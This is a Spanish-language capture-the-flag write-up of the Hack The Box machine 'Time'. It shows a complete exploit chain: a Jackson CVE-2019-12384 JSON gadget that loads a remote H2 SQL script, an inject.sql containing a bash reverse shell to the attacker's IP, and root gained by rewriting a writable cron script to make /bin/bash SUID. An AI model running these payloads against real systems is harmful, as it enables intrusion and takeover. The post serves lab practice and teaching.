---
layout: single
title: Time - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Time de la plataforma de Hackthebox donde vamos a estar explotando la vulnerabilidad CVE-2019-12384 que en el servicio web podremos ejecutar JSON al provocar un error veremos que se esta empleando Java y Jackson gracias a eso mediante un SSRF lo convertiremos a un RCE para la escalada de privilegios abusaremos de una tarea cron"
date: 2023-07-28
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-time/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Jackson CVE-2019-12384 
  - Abusing Cron Job 
---

<p align="center">
<img src="/assets/images/htb-writeup-time/banner.png">
</p>

```bash
❯ ping -c 1 10.129.141.133
PING 10.129.141.133 (10.129.141.133) 56(84) bytes of data.
64 bytes from 10.129.141.133: icmp_seq=1 ttl=63 time=167 ms

--- 10.129.141.133 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 167.057/167.057/167.057/0.000 ms
❯ whichSystem.py 10.129.141.133

10.129.141.133 (ttl -> 63): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,80 10.129.141.133 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-27 12:15 CST
Nmap scan report for 10.129.141.133
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f7d97825f042be00a56325d145682d4 (RSA)
|   256 24ea5349d8cb9bfcd6c426efdd34c11e (ECDSA)
|_  256 fe2534e43edf9fed622aa49352cccd27 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion

Tenemos 2 puertos abiertos así que vamos a comenzar viendo las tecnologías que están corriendo en el puerto **80**

```ruby
❯ whatweb http://10.129.141.133
http://10.129.141.133 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.141.133], JQuery[3.2.1], Script, Title[Online JSON parser]
```

Esta es la pagina **web** nos hablan de **JSON** y nos dicen que podemos ver el **output** de lo que ingresemos

![](/assets/images/htb-writeup-time/web1.png)

Si nos vamos a **Validate (Beta)** y probamos con `{7*7}` vemos que nos da un error

![](/assets/images/htb-writeup-time/web2.png)

Bueno si podemos lo siguiente `"esta es una cadena"` vemos que nos dice que la validación es correcta

![](/assets/images/htb-writeup-time/web3.png)

Si hacemos **fuzzing** vemos una ruta nueva pero como tal no es interesante

```bash
❯ dirsearch -u http://10.129.141.133

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.129.141.133/_23-07-27_12-28-35.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-07-27_12-28-35.log

Target: http://10.129.141.133/

[12:28:35] Starting: 
[12:28:37] 301 -  313B  - /js  ->  http://10.129.141.133/js/
[12:28:42] 403 -  279B  - /.ht_wsr.txt
[12:28:42] 403 -  279B  - /.htaccess.bak1
[12:28:42] 403 -  279B  - /.htaccess.sample
[12:28:42] 403 -  279B  - /.htaccess.orig
[12:28:42] 403 -  279B  - /.htaccess.save
[12:28:42] 403 -  279B  - /.htaccess_extra
[12:28:42] 403 -  279B  - /.htaccess_orig
[12:28:42] 403 -  279B  - /.htaccess_sc
[12:28:42] 403 -  279B  - /.htaccessOLD
[12:28:42] 403 -  279B  - /.htaccessOLD2
[12:28:42] 403 -  279B  - /.htaccessBAK
[12:28:42] 403 -  279B  - /.htm
[12:28:42] 403 -  279B  - /.html
[12:28:42] 403 -  279B  - /.htpasswds
[12:28:42] 403 -  279B  - /.htpasswd_test
[12:28:42] 403 -  279B  - /.httr-oauth
[12:28:44] 403 -  279B  - /.php
[12:29:12] 301 -  314B  - /css  ->  http://10.129.141.133/css/
[12:29:16] 301 -  316B  - /fonts  ->  http://10.129.141.133/fonts/
[12:29:18] 403 -  279B  - /images/
[12:29:18] 301 -  317B  - /images  ->  http://10.129.141.133/images/
[12:29:19] 200 -    4KB - /index.php
[12:29:19] 200 -    4KB - /index.php/login/
[12:29:20] 301 -  321B  - /javascript  ->  http://10.129.141.133/javascript/
[12:29:20] 403 -  279B  - /js/
[12:29:33] 403 -  279B  - /server-status
[12:29:33] 403 -  279B  - /server-status/
[12:29:39] 403 -  279B  - /vendor/

Task Completed
```

Bueno cuando ponemos algo mal nos da un error de validación 

```bash
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

## Shell as pericles

# Jackson 

Si buscamos el error en `google` vemos que nos hablan de `Jackson` que es lo que vemos en el error 

![](/assets/images/htb-writeup-time/web4.png)

<https://blog.doyensec.com/2019/07/22/jackson-gadgets.html>

Aquí ya nos van diciendo que hacer

![](/assets/images/htb-writeup-time/web5.png)

Vamos a ver si podemos ejecutar comandos siguiendo la explicación del articulo

```bash
❯ catn xd
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"}]
```

Ahora no lo copiamos

```bash
❯ cat xd | tr -d '\n' | xclip -sel clip
```

Ahora mediante un servidor en `python3` vamos a ver si recibimos una peticion ya que de primeras va a hacer una petición a ese recurso pero por el momento no existe `inject.sql`

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![](/assets/images/htb-writeup-time/web6.png)

Ahora le damos `PROCESS` y recibimos la petición a nuestro servidor

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.141.133 - - [27/Jul/2023 13:27:28] code 404, message File not found
10.129.141.133 - - [27/Jul/2023 13:27:28] "GET /inject.sql HTTP/1.1" 404 -
```

Ahora sabiendo que si hace la petición ya podemos como tal crear el `inject.sql` con el contenido que nos dicen 

Vamos a validar si tenemos `trasa` enviándonos un `ping` a nuestra maquina de atacante

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Ahora inyectamos esto en la `web`

![](/assets/images/htb-writeup-time/web7.png)

Y recibimos la petición

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.141.133 - - [27/Jul/2023 13:39:46] "GET /inject.sql HTTP/1.1" 200 -
```

Y recibimos la `trasa`

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:39:47.062972 IP 10.129.141.133 > 10.10.14.100: ICMP echo request, id 1, seq 1, length 64
13:39:47.062994 IP 10.10.14.100 > 10.129.141.133: ICMP echo reply, id 1, seq 1, length 64
```

Como tenemos ejecución remota de comandos ahora si podemos ganar acceso

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
```

Ahora modificamos el `payload` para que nos envié la `reverse shell`

```bash
❯ catn inject.sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.100/443 0>&1')
```

Ahora hacemos lo mismo 

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![](/assets/images/htb-writeup-time/web8.png)

Y ganamos acceso

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.141.133 55146
bash: cannot set terminal process group (996): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ whoami
whoami
pericles
pericles@time:/var/www/html$ 
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.141.133 - - [27/Jul/2023 13:47:04] "GET /inject.sql HTTP/1.1" 200 -
```

Ahora obtenemos una consola interactiva

```bash
pericles@time:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
pericles@time:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
pericles@time:/var/www/html$ export TERM=xterm
```

## User flag

```bash
pericles@time:/home/pericles$ cat user.txt 
031f4fc3e0fa4e5d4b8e33e819da2592
pericles@time:/home/pericles$ 
```

## Escalada de privilegios

Bueno no vamos a explotar el `pkexec` por que no es la idea

```bash
pericles@time:/$ find \-perm -4000 2>/dev/null | grep -v "snap"
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/bin/at
./usr/bin/fusermount
./usr/bin/chfn
./usr/bin/pkexec
./usr/bin/mount
./usr/bin/sudo
./usr/bin/su
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/chsh
./usr/bin/passwd
./usr/bin/newgrp
pericles@time:/$ 
```

Nada interesante

```bash
pericles@time:/$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
pericles@time:/$ 
```

Vamos a subir el `pspy` para que nos enumere tareas que se están ejecutando <https://github.com/DominicBreuker/pspy/releases

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.141.133 - - [27/Jul/2023 13:58:52] "GET /pspy64 HTTP/1.1" 200 -
```

```bash
pericles@time:/dev/shm$ wget http://10.10.14.100:80/pspy64
```

Ahora lo ejecutamos

```bash
pericles@time:/dev/shm$ chmod +x pspy64 
pericles@time:/dev/shm$ ./pspy64 
```

![](/assets/images/htb-writeup-time/web9.png)


```bash
pericles@time:/dev/shm$ cat /usr/bin/timer_backup.sh 
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
pericles@time:/dev/shm$ ls -l /usr/bin/timer_backup.sh 
-rwxrw-rw- 1 pericles pericles 88 Jul 27 20:00 /usr/bin/timer_backup.sh
pericles@time:/dev/shm$ 
```

Vamos a editar el `script` para que le haga la `bash` `SUID`

```bash
pericles@time:/dev/shm$ nano /usr/bin/timer_backup.sh
pericles@time:/dev/shm$ cat /usr/bin/timer_backup.sh 
#!/bin/bash
chmod u+s /bin/bash
pericles@time:/dev/shm$ 
```

Ahora esperamos que se ejecute y listo

```bash
pericles@time:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Feb 25  2020 /bin/bash
pericles@time:/dev/shm$ 
```

## root.txt

Ahora nos convertirnos en `root` y vemos la flag

```bash
pericles@time:/dev/shm$ bash -p
bash-5.0# whoami
root
bash-5.0# pwd
/dev/shm
bash-5.0# cd /root
bash-5.0# cat root.txt 
321fd7046f50c42267c5059ec12473c8
bash-5.0# 
```
